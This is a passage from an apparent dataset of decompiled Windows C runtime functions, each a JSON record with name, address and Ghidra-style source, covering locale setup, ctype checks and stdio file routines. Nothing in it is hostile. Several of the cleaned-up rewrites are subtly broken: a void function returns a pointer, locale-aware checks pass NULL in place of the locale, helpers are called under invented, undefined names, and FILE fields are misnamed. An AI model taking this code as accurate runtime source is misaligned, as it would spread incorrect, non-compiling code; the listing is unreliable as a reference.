*threadLocalData;\n    size_t convertedStringSize;\n\n    sourceWideCharString = (undefined4 *)_call_wsetlocale(**param_1, (char *)*param_1[1]);\n    if (sourceWideCharString != (undefined4 *)0x0) {\n        threadLocalData = FUN_10029224();\n        localeInfoStruct.locinfo = *(pthreadlocinfo *)(threadLocalData + 0x4c);\n        localeInfoStruct.mbcinfo = *(pthreadmbcinfo *)(threadLocalData + 0x48);\n        convertedStringSize = 0;\n        errorCode = __wcstombs_s_l(&convertedStringSize, (char *)0x0, 0, (wchar_t *)sourceWideCharString, 0, &localeInfoStruct);\n        if (errorCode == 0) {\n            allocatedMemory = (uint *)__malloc_base(convertedStringSize + 4);\n            if (allocatedMemory != (uint *)0x0) {\n                errorCode = __wcstombs_s_l((size_t *)0x0, (char *)(allocatedMemory + 1), convertedStringSize, (wchar_t *)sourceWideCharString, 0xffffffff, &localeInfoStruct);\n                localeInfo = localeInfoStruct.locinfo;\n                if (errorCode == 0) {\n                    int *localeReference = (int *)(localeInfoStruct.locinfo)->lc_category[**param_1 + 1].wlocale;\n                    if (localeReference != (int *)0x0) {\n                        LOCK();\n                        int currentReferenceCount = *localeReference;\n                        *localeReference = currentReferenceCount + -1;\n                        UNLOCK();\n                        if (currentReferenceCount + -1 == 0) {\n                            FID_conflict__free((localeInfoStruct.locinfo)->lc_category[**param_1 + 1].wlocale);\n                            localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)0x0;\n                        }\n                    }\n                    if (((((byte)threadLocalData[0x350] & 2) == 0) && (((byte)DAT_1004e808 & 1) == 0)) &&\n                        (localeReference = (int *)localeInfo->lc_category[**param_1 + 1].wlocale, localeReference != (int *)0x0)) {\n                        LOCK();\n                        int currentReferenceCount = *localeReference;\n                        *localeReference = *localeReference + -1;\n                        UNLOCK();\n                        if (currentReferenceCount == 1) {\n                            FID_conflict__free(localeInfo->lc_category[**param_1 + 1].wlocale);\n                            localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)0x0;\n                        }\n                    }\n                    *allocatedMemory = localeInfo->lc_time_cp;\n                    localeInfo->lc_category[**param_1 + 1].wlocale = (wchar_t *)allocatedMemory;\n                    localeInfo->lc_category[**param_1].wrefcount = (int *)(allocatedMemory + 1);\n                    return allocatedMemory + 1;\n                }\n                if ((errorCode == 0x16) || (errorCode == 0x22)) goto LAB_10026803;\n                FID_conflict__free(allocatedMemory);\n            }\n        } else if ((errorCode == 0x16) || (errorCode == 0x22)) {\nLAB_10026803:\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n        sourceWideCharString = (undefined4 *)0x0;\n    }\n    return sourceWideCharString;\n}\n"}
{"Function Name": "_call_wsetlocale", "Address": "10026809", "Source Code": "\\*\nwchar_t * __cdecl _call_wsetlocale(int locale_id, char *multibyte_string)\n{\n    \n    wchar_t *result_locale = (multibyte_string == (char *)0x0) ? __wsetlocale(locale_id, (wchar_t *)0x0) : (wchar_t *)0x0;\n    \n    if (multibyte_string != (char *)0x0) {\n        uint buffer_size; \n        \n        errno_t conversion_status = _mbstowcs_s(&buffer_size, (wchar_t *)0x0, 0, multibyte_string, 0x7fffffff);\n        \n        \n        if ((conversion_status != 0) && ((conversion_status == 0x16 || (conversion_status == 0x22)))) {\n            \n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n        \n        wchar_t *wide_char_buffer = (wchar_t *)__calloc_base(buffer_size, 2);\n        \n        \n        if (wide_char_buffer != (wchar_t *)0x0) {\n            \n            conversion_status = _mbstowcs_s((size_t *)0x0, wide_char_buffer, buffer_size, multibyte_string, 0xffffffff);\n            \n            \n            if (conversion_status == 0) {\n                \n                result_locale = __wsetlocale(locale_id, wide_char_buffer);\n            } else if ((conversion_status == 0x16) || (conversion_status == 0x22)) {\n                \n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n            }\n        }\n        \n        FID_conflict__free(wide_char_buffer);\n    }\n    \n    return result_locale;\n}\n*\\ \n \nwchar_t * __cdecl _call_wsetlocale(int locale_id, char *multibyte_string)\n{\n    wchar_t *result_locale = (multibyte_string == (char *)0x0) ? __wsetlocale(locale_id, (wchar_t *)0x0) : (wchar_t *)0x0;\n    if (multibyte_string != (char *)0x0) {\n        uint buffer_size;\n        errno_t conversion_status = _mbstowcs_s(&buffer_size, (wchar_t *)0x0, 0, multibyte_string, 0x7fffffff);\n        if ((conversion_status != 0) && ((conversion_status == 0x16 || (conversion_status == 0x22)))) {\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n        wchar_t *wide_char_buffer = (wchar_t *)__calloc_base(buffer_size, 2);\n        if (wide_char_buffer != (wchar_t *)0x0) {\n            conversion_status = _mbstowcs_s((size_t *)0x0, wide_char_buffer, buffer_size, multibyte_string, 0xffffffff);\n            if (conversion_status == 0) {\n                result_locale = __wsetlocale(locale_id, wide_char_buffer);\n            } else if ((conversion_status == 0x16) || (conversion_status == 0x22)) {\n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n            }\n        }\n        FID_conflict__free(wide_char_buffer);\n    }\n    return result_locale;\n}"}
{"Function Name": "FUN_100268a6", "Address": "100268a6", "Source Code": "void load_locale_apis(undefined locale_param, undefined unused_param)\n{\n    \n    ___acrt_eagerly_load_locale_apis();\n    \n    \n    FID_conflict___acrt_lock_stream_and_call<class_<lambda_function>_>(4, (int *)&locale_param);\n    \n    \n    return;\n}"}
{"Function Name": "___pctype_func", "Address": "100268cf", "Source Code": "___pctype_func(void) \n{\n    __acrt_ptd *ptd_pointer; \n    ushort **locale_pointer; \n    ptd_pointer = FUN_10029224(); \n    locale_pointer = *(ushort ***)(ptd_pointer + 0x4c); \n    ___acrt_update_locale_info((int)ptd_pointer, (int *)&locale_pointer); \n    return *locale_pointer; \n}"}
{"Function Name": "__isdigit_l", "Address": "100268f5", "Source Code": "int __cdecl __isdigit_l(int character, _locale_t locale)\n{\n    int digitCheckResult;          \n    int localeData;      \n    FUN_1001bfff(&localeData, (__acrt_ptd **)locale); \n    digitCheckResult = __ischartype_l(character, 4, NULL); \n    return digitCheckResult;      \n}"}
{"Function Name": "__islower_l", "Address": "1002692d", "Source Code": "int __cdecl __islower_l(int characterCode, _locale_t localeData)\n{\n    int lowercaseCheckResult;          \n    int localeStorage;      \n    FUN_1001bfff(&localeStorage, (__acrt_ptd **)localeData); \n    lowercaseCheckResult = __ischartype_l(characterCode, 2, NULL); \n    return lowercaseCheckResult;      \n}"}
{"Function Name": "__isupper_l", "Address": "10026965", "Source Code": "int __cdecl __isupper_l(int character, _locale_t locale)\n{\n    int isUppercase;           \n    int localeData;       \n    FUN_1001bfff(&localeData, (__acrt_ptd **)locale); \n    isUppercase = __ischartype_l(character, 1, NULL); \n    return isUppercase;       \n}"}
{"Function Name": "__wcsdup", "Address": "10026a24", "Source Code": "\\*\nwchar_t * __cdecl __wcsdup(wchar_t *inputString) \n{\n    wchar_t *duplicatedString; \n    rsize_t stringSizeInWords; \n    if (inputString == (wchar_t *)0x0) { \n        return (wchar_t *)0x0; \n    }\n    \n    duplicatedString = inputString; \n    while (*duplicatedString) { \n        duplicatedString++; \n    }\n    \n    stringSizeInWords = (duplicatedString - inputString) + 1; \n    duplicatedString = (wchar_t *)FUN_10025334(stringSizeInWords * 2); \n    if (duplicatedString != (wchar_t *)0x0 && _wcscpy_s(duplicatedString, stringSizeInWords, inputString) != 0) { \n        __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n    }\n    \n    return duplicatedString; \n}\n*\\ \n \nwchar_t * __cdecl __wcsdup(wchar_t *inputString)\n{\n    wchar_t *duplicatedString;\n    rsize_t stringSizeInWords;\n    if (inputString == (wchar_t *)0x0) {\n        return (wchar_t *)0x0;\n    }\n    \n    duplicatedString = inputString;\n    while (*duplicatedString) {\n        duplicatedString++;\n    }\n    \n    stringSizeInWords = (duplicatedString - inputString) + 1;\n    duplicatedString = (wchar_t *)FUN_10025334(stringSizeInWords * 2);\n    \n    if (duplicatedString != (wchar_t *)0x0 && _wcscpy_s(duplicatedString, stringSizeInWords, inputString) != 0) {\n        __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n    }\n    \n    return duplicatedString;\n}"}
{"Function Name": "____lc_codepage_func", "Address": "10026a85", "Source Code": "UINT __cdecl ____lc_codepage_func(void)\n{\n    __acrt_ptd *threadDataPointer; \n    threadDataPointer = retrieveThreadData(); \n    updateLocaleInfo((int)threadDataPointer, (int *)(threadDataPointer + 0x4c)); \n    return *(UINT *)((*(int *)(threadDataPointer + 0x4c)) + 8); \n}"}
{"Function Name": "____lc_locale_name_func", "Address": "10026aac", "Source Code": "void __lc_locale_name_func(void)\n{\n    __acrt_ptd *locale_ptr; \n    locale_ptr = get_locale_ptr(); \n    update_locale_info((int)locale_ptr, (int *)(locale_ptr + 0x4c)); \n    return (wchar_t **)(*(int *)(locale_ptr + 0x4c) + 0xa0); \n}"}
{"Function Name": "____mb_cur_max_func", "Address": "10026ad5", "Source Code": "int __cdecl ____mb_cur_max_func(void)\n{\n    __acrt_ptd *threadLocalData; \n    threadLocalData = FUN_10029224(); \n    ___acrt_update_locale_info((int)threadLocalData, (int *)&threadLocalData->locale_info); \n    return *(int *)((int)threadLocalData->locale_info + 4); \n}"}
{"Function Name": "___acrt_locale_initialize_ctype", "Address": "10026afc", "Source Code": "void __cdecl ___acrt_locale_initialize_ctype(undefined4 *param_1)\n{\nBYTE *pBVar1;\nundefined4 *puVar2;\nbyte bVar3;\nint *piVar4;\nundefined4 *puVar5;\nint iVar6;\nLPCSTR pCVar7;\nBOOL BVar8;\nBYTE *pBVar9;\nuint uVar10;\nundefined4 *puVar11;\nundefined2 *puVar12;\nundefined4 *puVar13;\nundefined4 *local_4c;\nundefined4 local_48;\nundefined4 *local_44;\nundefined4 *local_40;\nundefined4 *local_3c;\nundefined4 *local_38;\nLPCSTR local_34;\nuint local_30;\nundefined4 *local_2c;\nundefined4 *local_28;\nundefined4 *local_24;\nundefined4 *local_20;\n_cpinfo local_1c;\nuint local_8;\nlocal_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\nlocal_38 = param_1;\nlocal_20 = (undefined4 *)0x0;\nlocal_24 = (undefined4 *)0x0;\nlocal_28 = (undefined4 *)0x0;\nlocal_34 = (LPCSTR)0x0;\nlocal_4c = param_1;\nlocal_48 = 0;\nif ((wchar_t *)param_1[0x2a] == (wchar_t *)0x0) {\npiVar4 = (int *)param_1[0x23];\nif (piVar4 != (int *)0x0) {\nLOCK();\n*piVar4 = *piVar4 + -1;\nUNLOCK();\n}\nparam_1[0x23] = 0;\nparam_1[0x24] = 0;\n*param_1 = &DAT_1003f228;\nparam_1[0x25] = &DAT_1003f4a8;\nparam_1[0x26] = &DAT_1003f628;\nparam_1[1] = 1;\ngoto LAB_10026e89;\n}\nlocal_2c = (undefined4 *)0x0;\nif (((wchar_t *)param_1[2] == (wchar_t *)0x0) &&\n(iVar6 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_4c,0,(wchar_t *)param_1[0x2a],0x1004,\n(wchar_t **)(param_1 + 2)), iVar6 != 0)) {\nLAB_10026e1a:\nFID_conflict__free(local_2c);\nFID_conflict__free(local_20);\nFID_conflict__free(local_24);\nFID_conflict__free(local_28);\n}\nelse {\nlocal_2c = (undefined4 *)__calloc_base(1,4);\nFID_conflict__free((void *)0x0);\nlocal_20 = (undefined4 *)__calloc_base(0x180,2);\nFID_conflict__free((void *)0x0);\nlocal_24 = (undefined4 *)__calloc_base(0x180,1);\nFID_conflict__free((void *)0x0);\nlocal_28 = (undefined4 *)__calloc_base(0x180,1);\nFID_conflict__free((void *)0x0);\npCVar7 = (LPCSTR)__calloc_base(0x101,1);\nlocal_34 = pCVar7;\nFID_conflict__free((void *)0x0);\nif ((local_2c == (undefined4 *)0x0) ||\n((((local_20 == (undefined4 *)0x0 || (pCVar7 == (LPCSTR)0x0)) ||\n(local_24 == (undefined4 *)0x0)) || (local_28 == (undefined4 *)0x0)))) goto LAB_10026e1a;\niVar6 = 0;\ndo {\npCVar7[iVar6] = (CHAR)iVar6;\niVar6 = iVar6 + 1;\n} while (iVar6 < 0x100);\nBVar8 = GetCPInfo(param_1[2],&local_1c);\nif ((BVar8 == 0) || (5 < local_1c.MaxCharSize)) goto LAB_10026e1a;\nlocal_30 = local_1c.MaxCharSize & 0xffff;\niVar6 = ___acrt_LCMapStringA\n((__acrt_ptd **)0x0,(wchar_t *)param_1[0x2a],0x100,pCVar7 + 1,0xff,\n(char *)((int)local_24 + 0x81),0xff,param_1[2],0);\nif ((iVar6 == 0) ||\n(iVar6 = ___acrt_LCMapStringA\n((__acrt_ptd **)0x0,(wchar_t *)param_1[0x2a],0x200,pCVar7 + 1,0xff,\n(char *)((int)local_28 + 0x81),0xff,param_1[2],0), iVar6 == 0))\ngoto LAB_10026e1a;\nif ((1 < (int)local_30) && (local_1c.LeadByte[0] != '\\0')) {\npBVar9 = local_1c.LeadByte + 1;\ndo {\nbVar3 = *pBVar9;\nif (bVar3 == 0) break;\nfor (uVar10 = (uint)pBVar9[-1]; (int)uVar10 <= (int)(uint)bVar3; uVar10 = uVar10 + 1) {\npCVar7[uVar10] = ' ';\nbVar3 = *pBVar9;\n}\npBVar1 = pBVar9 + 1;\npBVar9 = pBVar9 + 2;\n} while (*pBVar1 != 0);\n}\nlocal_3c = local_20 + 0x40;\niVar6 = ___acrt_GetStringTypeA((__acrt_ptd **)0x0,1,pCVar7,0x100,(LPWORD)local_3c,param_1[2],0);\npuVar5 = local_38;\nif (iVar6 == 0) goto LAB_10026e1a;\npuVar2 = (undefined4 *)((int)local_20 + 0xfe);\n*(undefined2 *)puVar2 = 0;\n*(undefined *)((int)local_24 + 0x7f) = 0;\nlocal_40 = local_24 + 0x20;\n*(undefined *)((int)local_28 + 0x7f) = 0;\n*(undefined *)local_40 = 0;\nlocal_44 = local_28 + 0x20;\n*(undefined *)local_44 = 0;\nif ((1 < (int)local_30) && (local_1c.LeadByte[0] != '\\0')) {\npBVar9 = local_1c.LeadByte + 1;\ndo {\nif (*pBVar9 == 0) break;\nuVar10 = (uint)pBVar9[-1];\nif (uVar10 <= *pBVar9) {\npuVar12 = (undefined2 *)((int)local_20 + uVar10 * 2 + 0x100);\ndo {\nuVar10 = uVar10 + 1;\n*puVar12 = 0x8000;\npuVar12 = puVar12 + 1;\n} while ((int)uVar10 <= (int)(uint)*pBVar9);\n}\npBVar1 = pBVar9 + 1;\npBVar9 = pBVar9 + 2;\n} while (*pBVar1 != 0);\n}\npuVar11 = local_20 + 0x80;\nfor (iVar6 = 0x3f; iVar6 != 0; iVar6 = iVar6 + -1) {\n*local_20 = *puVar11;\npuVar11 = puVar11 + 1;\nlocal_20 = local_20 + 1;\n}\n*(undefined2 *)local_20 = *(undefined2 *)puVar11;\npuVar11 = local_24 + 0x40;\npuVar13 = local_24;\nfor (iVar6 = 0x1f; iVar6 != 0; iVar6 = iVar6 + -1) {\n*puVar13 = *puVar11;\npuVar11 = puVar11 + 1;\npuVar13 = puVar13 + 1;\n}\n*(undefined2 *)puVar13 = *(undefined2 *)puVar11;\n*(undefined *)((int)puVar13 + 2) = *(undefined *)((int)puVar11 + 2);\npuVar11 = local_28 + 0x40;\npuVar13 = local_28;\nfor (iVar6 = 0x1f; iVar6 != 0; iVar6 = iVar6 + -1) {\n*puVar13 = *puVar11;\npuVar11 = puVar11 + 1;\npuVar13 = puVar13 + 1;\n}\n*(undefined2 *)puVar13 = *(undefined2 *)puVar11;\n*(undefined *)((int)puVar13 + 2) = *(undefined *)((int)puVar11 + 2);\npiVar4 = (int *)local_38[0x23];\nlocal_20 = puVar2;\nif (piVar4 != (int *)0x0) {\nLOCK();\niVar6 = *piVar4;\n*piVar4 = iVar6 + -1;\nUNLOCK();\nif (iVar6 + -1 == 0) {\nFID_conflict__free((void *)(local_38[0x24] + -0xfe));\nFID_conflict__free((void *)(puVar5[0x25] + -0x80));\nFID_conflict__free((void *)(puVar5[0x26] + -0x80));\nFID_conflict__free((void *)puVar5[0x23]);\n}\n}\n*local_2c = 1;\npuVar5[0x23] = local_2c;\n*puVar5 = local_3c;\npuVar5[0x24] = local_20;\npuVar5[0x25] = local_40;\npuVar5[0x26] = local_44;\npuVar5[1] = local_30;\n}\nFID_conflict__free(local_34);\nLAB_10026e89:\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_14 : undefined1\nLocal Variable: local_15 : undefined1\nLocal Variable: local_16 : undefined1\nLocal Variable: local_1c : undefined4\nLocal Variable: local_20 : undefined4\nLocal Variable: local_24 : undefined4\nLocal Variable: local_28 : undefined4\nLocal Variable: local_2c : undefined4\nLocal Variable: local_30 : undefined4\nLocal Variable: local_34 : undefined4\nLocal Variable: local_38 : undefined4\nLocal Variable: local_3c : undefined4\nLocal Variable: local_40 : undefined4\nLocal Variable: local_44 : undefined4\nLocal Variable: local_48 : undefined4\nLocal Variable: local_4c : undefined4"}
{"Function Name": "__get_stream_buffer_pointers", "Address": "10026fbe", "Source Code": "undefined4 __cdecl __get_stream_buffer_pointers(int input_value, int *output_pointer_1, int *output_pointer_2, int *output_pointer_3)\n{\n    \n    if (input_value == 0) {\n        \n        FUN_100253b8();\n        \n        FUN_1001de96();\n        \n        return 0x16;\n    }\n    \n    if (output_pointer_1 != (int *)0x0) {\n        *output_pointer_1 = input_value + 4;\n    }\n    \n    if (output_pointer_2 != (int *)0x0) {\n        *output_pointer_2 = input_value;\n    }\n    \n    if (output_pointer_3 != (int *)0x0) {\n        *output_pointer_3 = input_value + 8;\n    }\n    \n    return 0;\n}"}
{"Function Name": "__lock_file", "Address": "10027004", "Source Code": "void __cdecl __lock_file(FILE *filePointer)\n{\n    \n    EnterCriticalSection((LPCRITICAL_SECTION)(filePointer + 1));\n}"}
{"Function Name": "__unlock_file", "Address": "10027018", "Source Code": "void __cdecl __unlock_file(FILE *filePointer)\n{\n    \n    LeaveCriticalSection((LPCRITICAL_SECTION)(filePointer + 1));\n}"}
{"Function Name": "__fclose_nolock", "Address": "1002702c", "Source Code": "int __cdecl __fclose_nolock(FILE *file_pointer)\n{\n    int return_value = -1; \n    if (file_pointer == (FILE *)0x0) { \n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n    } else if (((uint)file_pointer->_flag >> 0xd & 1) != 0) { \n        return_value = flush_file_buffer(file_pointer); \n        free_file_buffer(&file_pointer->_ptr); \n        if (close_file_descriptor(get_file_descriptor(file_pointer)) < 0) { \n            return_value = -1; \n        } else if (file_pointer->_tmpfname != (char *)0x0) { \n            free_temporary_filename(file_pointer->_tmpfname); \n            file_pointer->_tmpfname = (char *)0x0; \n        }\n    }\n    free_stream(&file_pointer->_ptr); \n    return return_value; \n}"}
{"Function Name": "_fclose", "Address": "100270a2", "Source Code": "int __cdecl _fclose(FILE *file_pointer)\n{\n    int close_result;\n    \n    if (file_pointer == (FILE *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        \n        FUN_1001de96();\n    } else {\n        \n        if (((uint)file_pointer->_flag >> 0xc & 1) == 0) {\n            \n            __lock_file(file_pointer);\n            \n            close_result = __fclose_nolock(file_pointer);\n            \n            FUN_10027118();\n            \n            return close_result;\n        }\n        \n        __acrt_stdio_free_stream(&file_pointer->_ptr);\n    }\n    \n    return -1;\n}"}
{"Function Name": "FUN_1002728c", "Address": "1002728c", "Source Code": "void __cdecl FUN_1002728c(int input_value, int **pointer_to_array)\n{\n    \n    FUN_100271a3(&input_value, pointer_to_array);\n    return; \n}"}
{"Function Name": "__acrt_lock_stream_and_call<class_<lambda_39ca0ed439415581b5b15c265174cece>_>", "Address": "100272b4", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_stream_and_call<class_<lambda_39ca0ed439415581b5b15c265174cece>_>\n(_iobuf *param_1,<lambda_39ca0ed439415581b5b15c265174cece> *param_2)\n{\n    \n    __crt_seh_guarded_call<void> local_5;\n    \n    __crt_seh_guarded_call<void>::\n    operator()<class_<lambda_2866be3712abc81a800a822484c830d8>,class_<lambda_39ca0ed439415581b5b15c265174cece>&,class_<lambda_2b24c74d71094a6cd0cb82e44167d71b>_>\n    (&local_5, param_1, param_2, param_1); \n    return; \n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_stream_and_call<class_<lambda_39ca0ed439415581b5b15c265174cece>_>\n(_iobuf *param_1,<lambda_39ca0ed439415581b5b15c265174cece> *param_2)\n{\n    __crt_seh_guarded_call<void> local_5;\n    __crt_seh_guarded_call<void>::\n    operator()<class_<lambda_2866be3712abc81a800a822484c830d8>,class_<lambda_39ca0ed439415581b5b15c265174cece>&,class_<lambda_2b24c74d71094a6cd0cb82e44167d71b>_>\n    (&local_5, param_1, param_2, param_1);\n    return;\n}"}
{"Function Name": "FID_conflict:__acrt_lock_and_call<class_<lambda_76b7ce3881063c72d9d9c3f590a24f96>_>", "Address": "100272dc", "Source Code": "\\*\nvoid __cdecl\nFID_conflict___acrt_lock_and_call<class_<lambda_76b7ce3881063c72d9d9c3f590a24f96>_>\n(undefined4 param_1,<lambda_9a32fed5bf61b6b509b2d3f6003082a1> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    __crt_seh_guarded_call<int>::\n    operator()<class_<lambda_6d20deecaf4856105ebacbad442d1079>,class_<lambda_9a32fed5bf61b6b509b2d3f6003082a1>&,class_<lambda_63ea2239ed67c638ddbae41947fdf875>_>\n    (&local_5, \n    (<lambda_6d20deecaf4856105ebacbad442d1079> *)&param_1, \n    param_2, \n    (<lambda_63ea2239ed67c638ddbae41947fdf875> *)&param_1); \n    \n    return;\n}\n*\\ \n \nvoid __cdecl\nFID_conflict___acrt_lock_and_call<class_<lambda_76b7ce3881063c72d9d9c3f590a24f96>_>\n(undefined4 param_1,<lambda_9a32fed5bf61b6b509b2d3f6003082a1> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    __crt_seh_guarded_call<int>::\n    operator()<class_<lambda_6d20deecaf4856105ebacbad442d1079>,class_<lambda_9a32fed5bf61b6b509b2d3f6003082a1>&,class_<lambda_63ea2239ed67c638ddbae41947fdf875>_>\n    (&local_5,(<lambda_6d20deecaf4856105ebacbad442d1079> *)&param_1,param_2,\n    (<lambda_63ea2239ed67c638ddbae41947fdf875> *)&param_1);\n    return;\n}"}
{"Function Name": "FUN_10027304", "Address": "10027304", "Source Code": "int __cdecl FUN_10027304(char inputChar)\n{\n    int result = 0; \n    int tempValue = 0; \n    FUN_1002728c(8, &result); \n    if (inputChar == '\\0') { \n        result = tempValue; \n    }\n    return result; \n}"}
{"Function Name": "FUN_10027343", "Address": "10027343", "Source Code": "uint __cdecl FUN_10027343(int input_value, int *output_pointer)\n{\n    uint *uint_pointer; \n    if (input_value != 0) { \n        uint_pointer = (uint *)(input_value + 0xc); \n        input_value = *uint_pointer >> 0xd; \n        if ((input_value & 1U) != 0) { \n            uint function_result = FUN_10027375(*uint_pointer); \n            if ((char)function_result != '\\0') { \n                return CONCAT31((int3)(function_result >> 8), 1); \n            }\n            (*output_pointer)++; \n            input_value = (int)output_pointer; \n        }\n    }\n    return input_value & 0xffffff00; \n}"}
{"Function Name": "FUN_10027375", "Address": "10027375", "Source Code": "uint __cdecl FUN_10027375(uint input_value)\n{\n    \n    undefined3 upper_bits = (undefined3)((input_value & 0xffffff03) >> 8);\n    \n    \n    if (((char)(input_value & 0xffffff03) == '\\x02') && ((input_value & 0xc0) != 0)) {\n        \n        return CONCAT31(upper_bits, 1);\n    }\n    \n    \n    return CONCAT31(upper_bits, (char)(input_value >> 0xb)) & 0xffffff01;\n}"}
{"Function Name": "___acrt_stdio_flush_nolock", "Address": "10027398", "Source Code": "undefined4 __cdecl ___acrt_stdio_flush_nolock(FILE *file_pointer)\n{\n    int *file_flag_pointer; \n    uint bytes_written;  \n    uint bytes_to_write;  \n    char *buffer;  \n    file_flag_pointer = &file_pointer->_flag; \n    \n    if ((((byte)*file_flag_pointer & 3) == 2) && ((*file_flag_pointer & 0xc0U) != 0)) {\n        buffer = (char *)file_pointer->_cnt; \n        bytes_to_write = (int)file_pointer->_ptr - (int)buffer; \n        file_pointer->_ptr = buffer; \n        file_pointer->_base = (char *)0x0; \n        \n        if (0 < (int)bytes_to_write) {\n            bytes_written = __write(__fileno(file_pointer), buffer, bytes_to_write); \n            \n            if (bytes_to_write != bytes_written) {\n                LOCK(); \n                *file_flag_pointer |= 0x10; \n                UNLOCK(); \n                return 0xffffffff; \n            }\n            \n            if (((uint)*file_flag_pointer >> 2 & 1) != 0) {\n                LOCK(); \n                *file_flag_pointer &= 0xfffffffd; \n                UNLOCK(); \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "__fflush_nolock", "Address": "100273fb", "Source Code": "int __cdecl __fflush_nolock(FILE *file_pointer)\n{\n    \n    if (file_pointer == (FILE *)0x0) {\n        \n        return FUN_10027304('\\0');\n    }\n    \n    \n    int flush_result = ___acrt_stdio_flush_nolock(file_pointer);\n    \n    if (flush_result != 0) {\n        return -1;\n    }\n    \n    \n    if (((uint)file_pointer->_flag >> 0xb & 1) != 0) {\n        \n        flush_result = __commit(__fileno(file_pointer));\n        \n        if (flush_result != 0) {\n            return -1;\n        }\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_1002744b", "Address": "1002744b", "Source Code": "int __cdecl FUN_1002744b(int inputParameter)\n{\n    int returnValue; \n    uint functionResult; \n    \n    if (inputParameter == 0) {\n        \n        returnValue = FUN_10027304('\\0');\n    }\n    else {\n        \n        functionResult = FUN_10027375(*(uint *)(inputParameter + 0xc));\n        \n        \n        if ((char)functionResult == '\\0') {\n            \n            returnValue = 0;\n        }\n        else {\n            \n            returnValue = FID_conflict___acrt_lock_and_call(inputParameter, (void *)&inputParameter);\n        }\n    }\n    \n    return returnValue;\n}"}
{"Function Name": "__fgetc_nolock", "Address": "1002748e", "Source Code": "uint __cdecl __fgetc_nolock(FILE *file_pointer)\n{\n    byte byte_read; \n    uint return_value; \n    \n    if (file_pointer == (FILE *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        return 0xffffffff; \n    }\n    \n    file_pointer->_base--; \n    \n    \n    if ((int)file_pointer->_base < 0) {\n        return FUN_1002f475(file_pointer); \n    }\n    \n    byte_read = *file_pointer->_ptr; \n    file_pointer->_ptr++; \n    return (uint)byte_read; \n}"}
{"Function Name": "_fgetc", "Address": "100274ca", "Source Code": "int __cdecl _fgetc(FILE *file_pointer) \n{\n    uint file_descriptor; \n    undefined *data_pointer; \n    undefined *another_data_pointer; \n    if (file_pointer == (FILE *)0x0) { \n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n    } else {\n        __lock_file(file_pointer); \n        if (((uint)file_pointer->_flag >> 0xc & 1) != 0) { \n            file_descriptor = __fgetc_nolock(file_pointer); \n            FUN_100275c2(); \n            return file_descriptor; \n        }\n        file_descriptor = __fileno(file_pointer); \n        if ((file_descriptor == 0xffffffff) || (file_descriptor == 0xfffffffe)) { \n            data_pointer = &DAT_1004e2b8; \n        } else {\n            data_pointer = (undefined *)((file_descriptor & 0x3f) * 0x30 + (&DAT_10050088)[(int)file_descriptor >> 6]); \n        }\n        another_data_pointer = &DAT_1004e2b8; \n        if (data_pointer[0x29] == '\\0') { \n            if ((file_descriptor != 0xffffffff) && (file_descriptor != 0xfffffffe)) { \n                another_data_pointer = (undefined *)((file_descriptor & 0x3f) * 0x30 + (&DAT_10050088)[(int)file_descriptor >> 6]); \n            }\n            if ((another_data_pointer[0x2d] & 1) == 0) { \n                file_descriptor = __fgetc_nolock(file_pointer); \n                FUN_100275c2(); \n                return file_descriptor; \n            }\n        }\n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n        __local_unwind4(&DAT_1004e008, 0xfffffffe); \n    }\n    return -1; \n}"}
{"Function Name": "_fgetpos", "Address": "100275cc", "Source Code": "int __cdecl _fgetpos(FILE *file_pointer, fpos_t *position_pointer)\n{\n    \n    if (file_pointer == (FILE *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n        return -1; \n    }\n    \n    \n    if (position_pointer == (fpos_t *)0x0) {\n        \n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n        return -1; \n    }\n    \n    \n    longlong current_position = FUN_1002fa2e(file_pointer);\n    \n    \n    *position_pointer = current_position;\n    \n    \n    return (current_position != -1) ? 0 : -1;\n}"}
{"Function Name": "__fputc_nolock", "Address": "10027627", "Source Code": "uint __cdecl __fputc_nolock(byte byte_value, FILE *file_pointer)\n{\n    \n    file_pointer->_base--;\n    \n    \n    if ((int)file_pointer->_base < 0) {\n        \n        return FUN_1002fc21(byte_value, file_pointer);\n    }\n    \n    \n    *file_pointer->_ptr = byte_value;\n    \n    \n    file_pointer->_ptr++;\n    \n    \n    return (uint)byte_value;\n}"}
